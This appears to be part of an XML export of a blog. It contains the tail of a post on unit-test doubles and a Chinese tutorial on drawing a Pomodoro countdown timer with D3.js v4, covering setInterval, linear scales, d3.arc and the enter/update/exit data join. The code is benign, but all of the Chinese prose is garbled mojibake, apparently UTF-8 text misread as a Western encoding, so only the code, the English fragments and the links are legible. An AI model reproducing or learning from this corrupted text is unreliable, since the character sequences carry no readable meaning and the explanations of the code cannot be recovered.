ç¸½çµæœ¬æ–‡ä»‹ç´¹äº†ä½•è¬‚æ¸¬è©¦æ›¿èº«ä»¥åŠæ¸¬è©¦æ›¿èº«çš„ç›®çš„ï¼Œé‚„ä»‹ç´¹äº† Dummy å’Œ Stub å…©ç¨®æ›¿èº«ï¼Œä¸‹ä¸€ç¯‡æœƒä»‹ç´¹å¦å¤–ä¸‰ç¨®æ¸¬è©¦æ›¿èº«ï¼Œå„˜è«‹æœŸå¾…ã€‚
å»¶ä¼¸é–±è®€
æˆ‘èŠçš„ä¸æ˜¯é‡‘åº¸ æ˜¯æ¸¬è©¦æ›¿èº«

é—œæ–¼ä½œè€…ï¼š@jyt0532 å¾Œç«¯å·¥ç¨‹å¸«ï¼Œå–œæ­¡å­¸ç¿’æ–°çŸ¥æŒ‘æˆ°æ–°äº‹ç‰©ï¼Œæœ€è¿‘åœ¨å¯«ä¸€æœ¬é—œæ–¼JVMçš„æ•™å­¸æ›¸ã€‚
]]></content>
      <tags>
        <tag>unitTest testDouble</tag>
      </tags>
  </entry>
  <entry>
    <title>è©³è§£ç°¡æ˜“ Timer ä¾†å­¸ç¿’ D3</title>
    <url>/2016/10/22/timer-d3-v4/</url>
    <content><![CDATA[The Pomodoro Technique æ˜¯ä¸€å€‹ç°¡æ˜“åˆå»£ç‚ºäººçŸ¥çš„æ™‚é–“ç®¡ç†æ–¹æ³•ï¼Œå…¶ä¸»è»¸åœ¨æ–¼å°‡å·¥ä½œæ™‚æ®µåˆ‡å‰²æˆå¤šå€‹è•ƒèŒ„æ™‚é–“ï¼Œæ¯å€‹è•ƒèŒ„æ™‚é–“åŒ…å«ï¼š

25 åˆ†é˜çš„åŸ·è¡Œæ™‚é–“
5 åˆ†é˜çš„ä¼‘æ¯æ™‚é–“

è•ƒèŒ„å·¥ä½œæ³• wikiè©³ç´°å…§å®¹ä¸ç®¡æ˜¯ç¶²è·¯ä¸Šï¼Œæˆ–æ˜¯æ›¸ç±éƒ½æœ‰è¨±å¤šæè¿°ï¼Œæœ‰èˆˆè¶£æ·±å…¥äº†è§£çš„å¯ä»¥å»çœ‹çœ‹ã€‚
ä»Šå¤©é‡é»ä¸åœ¨ç•ªèŒ„å·¥ä½œæ³•ã€‚
é‡é»åœ¨ï¼Œç•ªèŒ„å·¥ä½œæ³•ä¸­ä¸å¯æˆ–ç¼ºçš„å·¥å…· - è¨ˆæ™‚å™¨ï¼
æˆ‘ç”¨éå¹¾æ¬¾ Chrome extension çš„è¨ˆæ™‚å™¨ï¼Œä½†å‰©é¤˜æ™‚é–“éƒ½æ˜¯ç”¨æ•¸å­—ä¾†é¡¯ç¤ºï¼Œè€Œæˆ‘æƒ³è¦çš„æ˜¯ç”¨åœ–åƒçš„æ–¹å¼ä¾†å‘ˆç¾ï¼Œé€™æ¨£æˆ‘çš„å¤§è…¦å¯ä»¥çœç•¥æ‰è¾¨è­˜æ•¸å­—çš„æ™‚é–“ï¼ˆæ˜¯æœƒèŠ±ä½ å¤šå°‘æ™‚é–“â€¦ XDï¼‰ï¼Œä¹Ÿå› ç‚ºæ²’æœ‰äº†æ•¸å­—ï¼Œä¸çŸ¥é“ç¢ºåˆ‡å‰©é¤˜æ™‚é–“ï¼Œä¸æœƒçœ‹å‰©ä¸€åˆ†é˜å°±å› ç‚ºç·Šå¼µè€Œåˆ†å¿ƒï¼ˆè‡³å°‘å°æˆ‘è€Œè¨€å•¦~ï¼‰ã€‚
æ‰€è¬‚åœ–åƒçš„å‘ˆç¾æ–¹å¼å°±åƒä¸‹é¢çš„æˆå“ï¼Œè¼¸å…¥å®Œä½ æƒ³è¦çš„å€’æ•¸æ™‚é–“å¾Œï¼ŒæŒ‰ä¸‹enterï¼Œå°±æœƒçœ‹åˆ°å€’æ•¸çš„å€å¡Šä»¥åŠå€’æ•¸ç§’æ•¸ã€‚
See the Pen Timer-d3-v4 by Arvin (@arvin0731) on CodePen.

[Inspired by @ericbullington](https://www.ericbullington.com/blog/2012/10/27/d3-oclock/)

ä¸€é–‹å§‹æœ¬ä¾†æƒ³èªªçœ‹èƒ½ä¸èƒ½ç›´æ¥ç”¨ htmlã€css æŠŠåœ–ç•«å‡ºä¾†ï¼Œä½†è¦è¨ˆç®—å¼§åº¦ç•«å‡ºæ‰‡å‹æ„Ÿè¦ºæœ‰é»éº»ç…©ï¼Œå¥½åœ¨æˆ‘å€‘æœ‰ D3.js é€™å€‹æ–¹ä¾¿çš„å·¥å…·ï¼é™¤äº†æ‹¿ä¾†è³‡æ–™è¦–è¦ºåŒ–å¤–ï¼Œd3.js æä¾›çš„è¨±å¤š lib éƒ½å¾ˆé©åˆæ‹¿ä¾†å–®ç´”ä½œç•«ã€‚ä¸¦ä¸”ï¼Œå¯¦ä½œè¨ˆæ™‚å™¨çš„é›£åº¦ä¸¦ä¸é«˜ï¼Œéå¸¸é©åˆåˆå­¸è€…ä¾†å­¸ç¿’ D3.jsï¼Œåˆæ¯”ç•«å‡ºé•·æ¢åœ–ç­‰ä¾†å¾—æœ‰æˆå°±æ„Ÿï¼ï¼ˆæˆ–æ˜¯åƒæˆ‘ã„§æ¨£å¾ˆä¹…æ²’ç¢° d3ï¼Œåˆæƒ³ç¨ç¨è¤‡ç¿’ä¸€ä¸‹çš„äººä¹Ÿå¯ä»¥çœ‹çœ‹ï¼ï¼‰
å› æ­¤ï¼Œä»Šå¤©å°±ä¾†èªªæ˜å¦‚ä½•åˆ©ç”¨ D3.js ä¾†ç¹ªè£½ Time timerï¼ä¸¦åœ¨æœ€å¾Œè§£é‡‹ä¸€é» D3 data join çš„æ¦‚å¿µã€‚
Make a plan &amp; Prepare your dataåœ¨æ‰“é–‹ä½ çš„ç·¨è¼¯å™¨é–‹å§‹ coding ä¹‹å‰ï¼Œè®“æˆ‘å€‘å…ˆåœä¸‹ä¾†æƒ³ä¸€ä¸‹ï¼Œç¹ªè£½è¨ˆæ™‚å™¨ä½ å¤§æ¦‚æœƒéœ€è¦å“ªäº›æ±è¥¿ã€‚

ä½ éœ€è¦ä¸€å€‹åœ“åœˆä»£è¡¨æ™‚é˜ã€‚

ä½ éœ€è¦ä¸€å€‹ç§’é‡ï¼Œè®“ä½ çŸ¥é“æ™‚é–“ä¸æ–·åœ¨è·‘ã€‚

ä½ éœ€è¦ä¸€å€‹æœƒéš¨è‘—æ™‚é–“æµé€è€Œç¸®å°é¢ç©çš„æ‰‡è¡Œå€å¡Šã€‚

ä½ éœ€è¦ä¸€å€‹è¼¸å…¥ç­ï¼Œè®“ä½¿ç”¨è€…è¼¸å…¥æƒ³è¦å€’æ•¸çš„æ™‚é–“ã€‚


å…ˆä¸ç®¡åœ“åœˆã€ç§’é‡èˆ‡æ‰‡å½¢è©²æ€éº¼ç•«ï¼ŒD3.js æ¯”è¼ƒä¸ä¸€æ¨£çš„åœ°æ–¹åœ¨æ–¼å®ƒæ˜¯ data-drivenï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦å…ˆæŠŠè³‡æ–™çµ¦æº–å‚™å¥½ï¼Œè€Œç¹ªè£½è¨ˆæ™‚å™¨æ‰€éœ€è¦çš„è³‡æ–™å°±æ˜¯æ™‚é–“ã€‚
åœ¨æˆ‘å€‘çš„ case è£¡é¢ï¼Œæ™‚é–“æ˜¯ä½¿ç”¨è€…è¼¸å…¥çš„æ•¸å­—ï¼Œæˆ‘å€‘è¦å°‡å…¶ parse ç‚ºé©åˆçš„è³‡æ–™æ ¼å¼ï¼š
const timeData = (minutes, sec) =&gt; &#123;  return [    &#123;      &quot;unit&quot;: &quot;seconds&quot;,      &quot;numeric&quot;: sec    &#125;, &#123;      &quot;unit&quot;: &quot;minutes&quot;,      &quot;numeric&quot;: minutes    &#125;  ];&#125;;

æ­¤å¤–ï¼Œä¸€èˆ¬ç¹ªè£½ D3.js éƒ½æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œä¹Ÿå°±æ˜¯è®€å…¥è³‡æ–™å¾Œï¼Œæ ¹æ“šè©²æ¬¡è®€å…¥çš„è³‡æ–™ç¹ªè£½åœ–å½¢ã€‚æˆ‘å€‘éœ€è¦çš„å‰‡æ˜¯é¡ä¼¼ streaming data çš„è¡Œç‚ºï¼Œä¸é–“æ–·çš„å‚³å…¥ç›®å‰æ™‚é–“ï¼Œè®“ D3 å¹«æˆ‘å€‘ç¹ªè£½å‡ºå°æ‡‰çš„åœ–å½¢ã€‚ä½œæ³•æœ‰å¾ˆå¤šç¨®ï¼Œé€™é‚Šæ¡ç”¨æœ€ç°¡å–®çš„åšæ³•ï¼šsetInterval
let timer;const startTimer = (e) =&gt; &#123;  // Main program    if (isNaN(e.target.valueAsNumber)) &#123;      clearInterval(timer);      clockGroup.selectAll(&quot;.clockhand&quot;).remove();      return;    &#125;;    clearInterval(timer);    let data;    let timeAsSec = e.target.valueAsNumber * 60;    let sec = 0;    timer = setInterval(() =&gt; &#123;      data = timeData(timeAsSec / 60, sec);      sec = sec + 1;      timeAsSec = timeAsSec - 1;      // render() ç‚ºç¹ªè£½ d3 çš„å‡½å¼      render(data);      if (timeAsSec === 0) &#123;        clearInterval(timer);      &#125;    &#125;, 1000);&#125;;let timeInput = document.querySelector(&#x27;#time&#x27;);timeInput.addEventListener(&quot;change&quot;, startTimer);

startTimer æ˜¯ç¶å®šåœ¨ input field çš„ EventListenerï¼Œæˆ‘å€‘æ ¹æ“šä½¿ç”¨è€…è¼¸å…¥çš„æ•¸å­—ä¹˜ä¸Š 60 è½‰æ›ç‚ºéœ€è¦åŸ·è¡Œçš„ç¸½ç§’æ•¸(timeAsSec)ã€‚ç›®çš„æ˜¯ç‚ºäº†èƒ½å¤ é©æ™‚ï¼ˆå€’æ•¸çµæŸï¼‰çš„è·³å‡º setInterval()ã€‚
åœ¨ setInterval() ä¸­ï¼Œæˆ‘å€‘æ¯ç§’åŸ·è¡Œä¸€æ¬¡ï¼Œéæ¸› timeAsSecï¼ŒåŒæ™‚éå¢ sec ç”¨ä»¥è®“ç§’é‡è½‰å‹•ã€‚
å°‡ timeAsSec èˆ‡ sec å‚³å…¥å‰›å‰›çš„ timeData() ç”¢ç”Ÿ D3 éœ€è¦çš„è³‡æ–™æ ¼å¼ã€‚é€™é‚Šæˆ‘å€‘ç›´æ¥å°‡ timeAsSec é™¤ä»¥ 60ï¼Œçµæœæœƒæ˜¯åˆ†æ•¸ï¼Œå› æ­¤æˆ‘å€‘çš„åˆ†é˜å€å¡Šæœƒéš¨è‘—ç§’æ•¸çš„å¢åŠ è€Œé †é †çš„æ¸›å°‘ï¼Œè‹¥ä½ æƒ³è¦æœ‰æ˜é¡¯è·³å‹•ï¼Œå¯ä»¥è½‰ç‚ºæ•´æ•¸å¾Œå†ä¸Ÿå…¥ timeDataï¼ˆè½‰ç‚ºæ•´æ•¸çš„è©±ï¼Œåªæœ‰æ¯ 60 ç§’æ•¸å€¼æœƒè®Šå‹•ä¸€æ¬¡ï¼Œæ‰çœ‹å¾—åˆ°å·®åˆ¥ï¼‰ã€‚
ç¸½çµä¸€ä¸‹æ•´å€‹æµç¨‹ï¼š
æ¯ç§’åŸ·è¡Œä¸€æ¬¡ï¼Œå¾ timeData ä¸­ç”¢ç”Ÿæ–°çš„è³‡æ–™å‚³å…¥ render() å»ç¹ªè£½åœ–å½¢ï¼Œç›´åˆ° timeAsSec éæ¸›ç‚ºé›¶ã€‚
Render Settingè³‡æ–™éƒ½è¨­å®šå¥½å¾Œï¼Œæ¥è‘—æº–å‚™ç¹ªè£½åœ–å½¢ã€‚
// value settinglet width = 300;let height = 200;let offSetX = 150;let offSetY = 100;let pi = Math.PI;let scaleSecs = d3.scaleLinear().domain([0, 59 + 999 / 1000]).range([0, 2 * pi]);let scaleMins = d3.scaleLinear().domain([0, 59 + 59 / 60]).range([0, 2 * pi]);let vis = d3.selectAll(&quot;.chart&quot;)  .append(&quot;svg:svg&quot;)  .attr(&quot;width&quot;, width)  .attr(&quot;height&quot;, height);let clockGroup = vis.append(&quot;svg:g&quot;)  .attr(&quot;transform&quot;, &quot;translate(&quot; + offSetX + &quot;,&quot; + offSetY + &quot;)&quot;);clockGroup.append(&quot;svg:circle&quot;)  .attr(&quot;r&quot;, 80).attr(&quot;fill&quot;, &quot;none&quot;)  .attr(&quot;class&quot;, &quot;clock outercircle&quot;)  .attr(&quot;stroke&quot;, &quot;black&quot;)  .attr(&quot;stroke-width&quot;, 2);clockGroup.append(&quot;svg:circle&quot;)  .attr(&quot;r&quot;, 4)  .attr(&quot;fill&quot;, &quot;black&quot;)  .attr(&quot;class&quot;, &quot;clock innercircle&quot;);

line 2 ~ line 6 å…ˆå®šç¾©ä¸€äº›å¸¸æ•¸ï¼Œé€™é‚Šå°±éš¨æ„è¨­å®šã€‚

line 8 ~ line 9 è¨­å®š Mins èˆ‡ Secs çš„ scaleã€‚scale æ˜¯ä»€éº¼ï¼ŸåŸºæœ¬ä¸Šä½ å¯ä»¥æŠŠ scale æƒ³åƒæˆæ˜¯èƒ½å¤ å¹«ä½ æŠŠ è³‡æ–™æ˜ å°„ åˆ°é©åˆä½ æƒ³ç¹ªè£½åœ–å½¢çš„ç¶­åº¦ä¸Š çš„ä¸€ç¨®æ–¹æ³•ã€‚
let scaleSecs = d3.scaleLinear().domain([0, 59 + 999 / 1000]).range([0, 2 * pi]);let scaleMins = d3.scaleLinear().domain([0, 59 + 59 / 60]).range([0, 2 * pi]);

é€é domain èˆ‡ range ä¾†åˆ†åˆ¥çµ¦äºˆ è³‡æ–™çš„è¼¸å…¥ç¯„åœ ä»¥åŠ è³‡æ–™çš„è¼¸å‡ºç¯„åœï¼Œä»¥ä»Šå¤©çš„ case ä¾†èªªï¼Œæˆ‘å€‘è¦å°‡æ™‚é–“è³‡æ–™è½‰åŒ–ç‚ºåœ“å½¢çš„è§’åº¦ï¼Œå› æ­¤çµ¦äºˆ domain çš„è¼¸å…¥ç¯„åœç‚º 0 ~ 59ã€‚
range è² è²¬è¼¸å‡ºçš„ç¯„åœï¼Œæˆ‘å€‘è¦åœ¨åœ“å½¢çš„æ™‚é˜ä¸Šé¡¯ç¤ºï¼Œå› æ­¤æ˜¯ 0 ~ 2 * piã€‚
åˆ°é€™é‚Šä½ å¯èƒ½æœƒæƒ³ï¼Œdegree 0 è·Ÿ degree 360 ä¸æ˜¯ä¸€æ¨£å—ï¼Ÿé€™æ¨£ 0 ç§’è·Ÿ 59 ç§’æœƒæ˜ å°„åˆ°åŒä¸€å€‹é»ï¼Ÿ
å¥½å•é¡Œï¼æ‰€ä»¥å…ˆå‰çš„ seconds èˆ‡ minutes åŸºæœ¬ä¸Šå¯ä»¥å…±ç”¨ï¼Œä½†å¦‚æœæƒ³è¦å€åˆ¥ 0 ç§’èˆ‡ 59 ç§’ï¼Œæˆ‘å€‘éœ€è¦æŠŠç¯„åœå¤šåŠ ä¸Šå°æ•¸é»çš„ç¯„åœï¼Œä»¥åˆ†é˜ä¾†èªªï¼Œåˆ†æˆ 60 ç­‰ä»½ï¼Œå› æ­¤å°±æ˜¯ [0, 59 + 59&#x2F;60]ï¼Œç§’å‰‡æ˜¯åˆ†ç‚º 1000 æ¯«ç§’ï¼Œä¹Ÿå°±æ˜¯ [0, 59 + 999&#x2F;1000]ã€‚
line 11 ~ line 14 ç”±æ–¼ d3 çš„ method æ˜¯ Chainable çš„ï¼Œå› æ­¤å¯åˆ©ç”¨ d3.selectAll() é¸å–ä½ æƒ³è¦ mount ä¸Šå»çš„ DOM å…ƒç´ ï¼Œä¸¦æ¥è‘— append ä¸Š svg å…ƒç´ ï¼Œä»¥åŠè¨­å®š width èˆ‡ height çš„å±¬æ€§å€¼ã€‚
let vis = d3.selectAll(&quot;.chart&quot;)  .append(&quot;svg:svg&quot;)  .attr(&quot;width&quot;, width)  .attr(&quot;height&quot;, height);

line 16 ~ line 28 æ¡ç”¨åŒæ¨£æ–¹å¼ï¼Œåœ¨ vis é€™å€‹ svg å…ƒç´ ä¸‹ï¼Œå† append ä¸Šä¸€å€‹ svg groupï¼Œä¸¦åŠ å…¥å…©å€‹ circleã€‚
ç¬¬ä¸€å€‹ circle æ˜¯æ™‚é˜çš„å¤–åœï¼Œç¬¬äºŒå€‹ circle ä½œç‚ºæ™‚é˜ä¸­å¿ƒé»ã€‚
Render Timerçµ‚æ–¼å¯ä»¥é–‹å§‹ç•«åœ–ï¼
// render clockconst render = (data) =&gt; &#123;  let minuteArc, secondArc;  clockGroup.selectAll(&quot;.clockhand&quot;).remove();    secondArc = d3.arc()    .innerRadius(0)    .outerRadius(70)    .startAngle((d) =&gt; &#123;    return scaleSecs(d.numeric);  &#125;)    .endAngle((d) =&gt; &#123;    return scaleSecs(d.numeric);  &#125;);    minuteArc = d3.arc()    .innerRadius(0)    .outerRadius(80)    .startAngle((d) =&gt; &#123;    return 0;  &#125;)    .endAngle((d) =&gt; &#123;    return scaleMins(d.numeric);  &#125;);  clockGroup.selectAll(&quot;.clockhand&quot;)    .data(data)    .enter()    .append(&quot;svg:path&quot;)    .attr(&quot;d&quot;, (d) =&gt; &#123;      if (d.unit === &quot;seconds&quot;) &#123;        return secondArc(d);      &#125; else if (d.unit === &quot;minutes&quot;) &#123;        return minuteArc(d);      &#125;    &#125;)    .attr(&quot;class&quot;, &quot;clockhand&quot;)    .attr(&quot;stroke&quot;, (d) =&gt; &#123;      if (d.unit === &quot;seconds&quot;) &#123;        return &quot;black&quot;;      &#125; else if (d.unit === &quot;minutes&quot;) &#123;        return &quot;blue&quot;;      &#125;    &#125;)    .attr(&quot;stroke-width&quot;, (d) =&gt; &#123;      if (d.unit === &quot;seconds&quot;) &#123;        return 2;      &#125; else if (d.unit === &quot;minutes&quot;) &#123;        return 3;      &#125;    &#125;)    .attr(&quot;fill&quot;, &quot;red&quot;)    .attr(&quot;opacity&quot;, &quot;0.8&quot;);&#125;;

line 8 ~ line 26 å®šç¾©äº†å…©å€‹ method: secondArc å’Œ minuteArcï¼Œåˆ†åˆ¥ç”¨ä¾†å°‡å‚³å…¥çš„è³‡æ–™ä¾æ“šå…¶æ‰€è¨­å®šçš„ innerRadius ã€ outerRadius ã€ startAngle èˆ‡ endAngle ä¾†ç¹ªè£½æˆå¼§å½¢ã€‚ d3.arc() åœ¨ d3 v4 ä¸­å±¬æ–¼ d3-shape çš„ä¸€ç’°ã€‚

åœ¨ endAngle() ä¸­ï¼Œæˆ‘å€‘å°‡æ¥æ”¶åˆ°çš„åƒæ•¸ï¼ˆä¹Ÿå°±æ˜¯å‚³å…¥çš„è³‡æ–™ï¼‰æ”¾å…¥æˆ‘å€‘å…ˆå‰å®šç¾©å¥½çš„ scaleSecs() èˆ‡ scaleMins() ä¸­ï¼Œè®“ d3.arc() èƒ½æ¥æ”¶åˆ°æˆ‘å€‘æ˜ å°„éå¾Œçš„å€¼ï¼Œé€²è€Œç¹ªå‡ºæ­£ç¢ºçš„ scaleã€‚
æˆ‘å€‘è®“ç§’é‡çš„ startAngle èˆ‡ endAngle è¨­å®šç‚ºä¸€æ¨£ï¼Œä»¥å‘ˆç¾ é‡ çš„ç‹€æ…‹ã€‚è€Œ åˆ†é˜å€å¡Š å‰‡è®“å…¶ startAngle å›ºå®šç‚º 0ï¼Œåªåœ¨ endAngle ä¸­å‚³å…¥æ¯æ¬¡æ›´æ–°çš„æ™‚é–“ï¼Œå¦‚æ­¤ä¸€ä¾†ï¼Œæ¯æ¬¡æ™‚é–“æ›´æ–°æ™‚ï¼Œå€å¡Šæœƒéš¨ä¹‹æ”¹è®Šå¤§å°ï¼
æ­¤å¤–ï¼Œé€™é‚Šçš„innerRadius éƒ½è¨­ç‚º 0ï¼Œè®“å…¶ç­‰åŒæ–¼åœ“ä¸­å¿ƒï¼Œæ‰èƒ½ç”¢ç”Ÿæ‰‡å½¢ã€‚
line 28 ~ line 56 ï¼š é‚„è¨˜å¾—æœ€ä¸€é–‹å§‹æˆ‘å€‘æœ‰å°‡æœ€å¤–å±¤çš„ svg æŒ‡å®šçµ¦è®Šæ•¸ clockGroup å—ï¼Ÿ
let clockGroup = vis.append(&quot;svg:g&quot;)  .attr(&quot;transform&quot;, &quot;translate(&quot; + offSetX + &quot;,&quot; + offSetY + &quot;)&quot;);    ...  ..  .  clockGroup.selectAll(&quot;.clockhand&quot;)    .data(data)    .enter()    .append(&quot;svg:path&quot;)

åœ¨æœ€å¾Œä¸€æ®µè£¡é¢ï¼Œåˆ©ç”¨ clockGroup.selectAll(&quot;.clockhand&quot;) æˆ‘å€‘æŠŠè³‡æ–™ import åˆ°æ“æœ‰ .clockhand é€™å€‹ classname çš„ svg:path åº•ä¸‹ï¼Œé€éè¨­ç½® svg:path çš„ attribute dä¾†ç¹ªè£½ ç§’é‡ èˆ‡ åˆ†é¾å€å¡Šï¼ˆåˆ©ç”¨å…ˆå‰æåˆ°çš„ secondArc() èˆ‡ minuteArc() ï¼‰ã€‚
attr() å‡½å¼å¯ä»¥æ¥å— callbackï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æ ¹æ“šè³‡æ–™çš„ä¸åŒä¾†è¨­å®šä¸åŒçš„ styleï¼Œè®“ç§’é‡èˆ‡åˆ†é¾å€å¡Šåšå€‹åˆ†åˆ¥ã€‚
ä¸çŸ¥é“å¤§å®¶çœ‹åˆ°é€™é‚Šæœ‰æ²’æœ‰è¦ºå¾—å¥‡æ€ªï¼Œå¾æœ€ä¸€é–‹å§‹åˆ°ç¾åœ¨å¾ä¾†æ²’æœ‰è¨­ç½®é .clockhand é€™å€‹ class çš„ DOM å…ƒç´ ï¼Œç‚ºä»€éº¼æˆ‘å€‘é€™é‚Šå¯ä»¥ç›´æ¥ selectAll é‚„å¡å…¥è³‡æ–™ä¸¦ append svg å‘¢ï¼Ÿ
åŸå› æ˜¯åœ¨æ–¼ï¼Œd3 çš„ selectAll(), select() å¦‚æœæ‰¾ä¸åˆ°æ‰€æŒ‡å®šçš„å…ƒç´ æ™‚ï¼Œæœƒå›å‚³ä¸€å€‹ç©ºçš„ NodeListï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æ‹¿é€™å€‹ç©º NodeList å»é€²è¡Œæ“ä½œã€‚ä½†è¦è¨˜å¾—åœ¨ä½  append ä¸Šå»çš„ DOM å…ƒç´ ä¸­åŠ ä¸Šä½ æƒ³æŒ‡å®šçš„ classnameï¼Œå¦å‰‡æ¯æ¬¡åŸ·è¡Œé€™å€‹å‡½æ•¸çš„æ™‚å€™ï¼Œä»–å°±æœƒé‡æ–° create ä¸€å€‹ç©ºçš„ NodeListã€‚
é€™æœƒé€ æˆä»€éº¼å•é¡Œå‘¢ï¼Ÿä»¥æˆ‘å€‘é€™é‚Šå¯¦ä½œçš„ä¾‹å­ä¾†èªªï¼Œåœ¨æˆ‘å€‘çš„ render() ä¸€é–‹å§‹çš„åœ°æ–¹ï¼Œæˆ‘å€‘æœ‰å€‹
clockGroup.selectAll(&quot;.clockhand&quot;).remove();

é€™å€‹ remove() çš„å‹•ä½œæœƒåœ¨æˆ‘å€‘æ¯æ¬¡åŸ·è¡Œ render() çš„æ™‚å€™ï¼ˆä¹Ÿå°±æ˜¯ setInterval æ¯æ¬¡åŸ·è¡Œæ™‚ï¼‰å¹«æˆ‘å€‘æŠŠåŸå…ˆçš„ .cockhand DOM æ‹¿æ‰ï¼Œé‡æ–°ç¹ªè£½æ­£ç¢ºçš„ ç§’é‡ èˆ‡ åˆ†é˜å€å¡Šã€‚
è‹¥æˆ‘å€‘åœ¨ append svg:path çš„æ™‚å€™è¨­å®šä»–çš„ attr ç‚º clockhandï¼Œå‰‡æœƒé€ æˆé€™é‚ŠæŠ“ä¸åˆ° .clockhand è€Œç„¡æ³•ç§»é™¤åŸæœ‰çš„ DOMï¼ˆç§’é‡èˆ‡åˆ†é˜å€å¡Šï¼‰ã€‚
åƒæ˜¯é€™æ¨£ï¼š

å› æ­¤è¨˜å¾—è¦åŠ ä¸Šå°æ‡‰çš„ class nameã€‚
å¦å¤–ä¸€å€‹è¦æ³¨æ„çš„éƒ¨åˆ†æ˜¯ï¼ŒclockGroup.selectAll(&quot;.clockhand&quot;).remove(); ä»–é›–ç„¶æœƒç§»é™¤æ‰ DOM å…ƒç´ ï¼Œä½†æ˜¯ clockGroup.selectAll(&quot;.clockhand&quot;) é‚„æ˜¯æœƒç•™å­˜æœ‰å°åŸæœ¬è©² DOM å…ƒç´ çš„ referenceï¼Œæœ‰å¯èƒ½æœƒé€ æˆ memory leakï¼Œè‹¥æƒ³é¿å…è¨˜å¾—é¡å¤–è™•ç†é€™éƒ¨åˆ†ã€‚
å°ç¸½çµ èˆ‡ é™„éŒ„åˆ°é€™é‚Šç‚ºæ­¢æˆ‘å€‘å°±å·²ç¶“å¯¦ä½œå‡ºä¸€å€‹ç°¡æ˜“çš„ Timerï¼Œå¸Œæœ›èƒ½è®“å¤§å®¶å° d3 ç¹ªåœ–æœ‰ä¸€é»æ¦‚å¿µï¼Œè‡³æ–¼å†é€²éšä¸€é»çš„ï¼Œåƒæ˜¯äº’å‹•èˆ‡å‹•ç•«çš„éƒ¨åˆ†ï¼Œæ™‚é–“å¯¦åœ¨ä¸å¤šï¼Œåªèƒ½ä¸‹æ¬¡å†åŠªåŠ›æ‰¾å€‹ç¯„ä¾‹ä¾†å¯«å¯«ã€‚
Data joinä¸éæˆ‘æƒ³ç¨å¾®ä»‹ç´¹ä¸€é»é—œæ–¼ D3 è£¡é¢å¾ˆé‡è¦çš„ Data joinï¼Œå°ä¹‹å¾Œå¯¦ä½œæ›´è¤‡é›œçš„åœ–å½¢æ™‚æœ‰çµ•å°å¹«åŠ©ã€‚
å…ˆçµ¦é»è³‡æºï¼š
D3 ä½œè€…é—œæ–¼ data join çš„èªªæ˜ï¼ˆå¿…çœ‹ï¼‰ï¼šThinking with joins
UNC çš„ data join è¦–è¦ºåŒ–æ•™å­¸ï¼ˆä¹Ÿæ˜¯å¿…çœ‹, ä¸Šé¢é‚£ç¯‡å¤ªé•·çœ‹ä¸ä¸‹å»ç›´æ¥çœ‹é€™é‚Šå¯ä»¥ç§’æ‡‚ï¼‰ï¼šDat joins in D3.js
åœ¨æˆ‘å€‘å…ˆå‰çš„ç¯„ä¾‹è£¡é¢ï¼Œæœ‰ç”¨åˆ° clockGroup.selectAll(&quot;.clockhand&quot;).data().enter()ï¼Œæ„æ€æ˜¯å°‡è³‡æ–™è·Ÿ DOM é€£æ¥ï¼Œä¸¦å°‡é€²å…¥ enter é¸å–ç‹€æ…‹ çš„è³‡æ–™å‚³éåˆ°å¾Œé¢çš„ method ï¼ˆåƒæ˜¯ attr()ï¼‰ä¸­ã€‚
å—¯ï¼Ÿï¼ enter() ä¸æ˜¯æŒ‡æŠŠè³‡æ–™ enter (è¼¸å…¥) é€²å»çš„æ„æ€å–”ï¼
æ˜¯ï¼Œä¹Ÿä¸æ˜¯ã€‚

åœ¨ D3 ä¸­ï¼Œè³‡æ–™åœ¨ç¹«çµåˆ° DOM ä¸Šæ™‚ï¼Œæœƒåˆ†åˆ¥é€²å…¥ä¸‰ç¨®é¸å–ç‹€æ…‹ï¼šenter, update èˆ‡ exitã€‚
[Note] selection ä»£è¡¨çš„æ˜¯ selectAll() æˆ– select() æ‰€é¸å–åˆ°çš„ d3 node objectã€‚
update selection: ç•¶ä½  selection ä¸­çš„è³‡æ–™èˆ‡æ–°çš„ .data()å‚³éé€²ä¾†çš„è³‡æ–™æœ‰é‡ç–Šæ™‚ï¼Œæ–°çš„è³‡æ–™æœƒé€²å…¥ update selection ç‹€æ…‹ï¼Œå¯ä»¥é€²è¡Œè³‡æ–™æ›´æ–°ã€‚
exit selection: ç•¶ä½ åŸæœ¬ selection ä¸­çš„è³‡æ–™èˆ‡æ–°çš„è³‡æ–™æ²’æœ‰åŒ¹é…æ™‚ï¼Œé‚£äº›èˆŠæœ‰çš„è³‡æ–™æœƒé€²å…¥ exit selection ç‹€æ…‹ï¼Œå¯ä»¥é€éå‘¼å« .exit().remove() å°‡ä¹‹å¾ selection ä¸­ç§»é™¤ã€‚
enter selection: èˆ‡ update ç›¸åï¼Œåœ¨åŸæœ¬ selection ä¸­æ‰¾ä¸åˆ°å°æ‡‰çš„æ–°è³‡æ–™å°±æœƒé€²å…¥ enter selectionã€‚
æ‰€ä»¥ï¼Œç•¶ä½ æƒ³è¦åœ¨åŸæœ¬çš„åœ–å½¢å…§æ›´æ–°è³‡æ–™æ™‚ï¼Œå¯ä»¥ç›´æ¥å‘¼å« selectAll(&#39;.oldData&#39;).data(newData)ï¼Œè©²é€²å…¥ update ç‹€æ…‹çš„è³‡æ–™å°±æœƒå–ä»£æ‰èˆŠçš„ï¼Œæ¥è‘—å†å‘¼å« selectAll().exit().remove() ç§»é™¤æ‰å…¶ä»–ä¸å† newData å…§çš„è³‡æ–™ï¼Œæœ€å¾Œå‘¼å« selectAll().enter().append() ä¾†æŠŠä¸åœ¨èˆŠè³‡æ–™ä¸­ï¼Œä½†åœ¨ newData ä¸­çš„è³‡æ–™æ–°å¢ä¸Šå»ã€‚
å¼·åŠ›æ¨è–¦æ­é…åƒè€ƒ Dat joins in D3.jsï¼Œè£¡é¢çš„ç¯„ä¾‹éå¸¸æ¸…æ¥šï¼Œæœ‰æ©Ÿæœƒæˆ‘æœƒç¿»æˆä¸­æ–‡ç‰ˆçš„ã€‚
äº†è§£è³‡æ–™åœ¨ d3 ä¸­çš„ç‹€æ…‹å¾Œï¼Œå°æ–¼å¾ŒçºŒè¨­è¨ˆäº’å‹•æ•ˆæœèˆ‡è³‡æ–™æ›´æ–°ç­‰ç­‰çš„æ“ä½œæœƒæ›´å¾—å¿ƒæ‡‰æ‰‹ï¼
åƒè€ƒè³‡æ–™
Thinking with joins
Dat joins in D3.js
d3-oclock

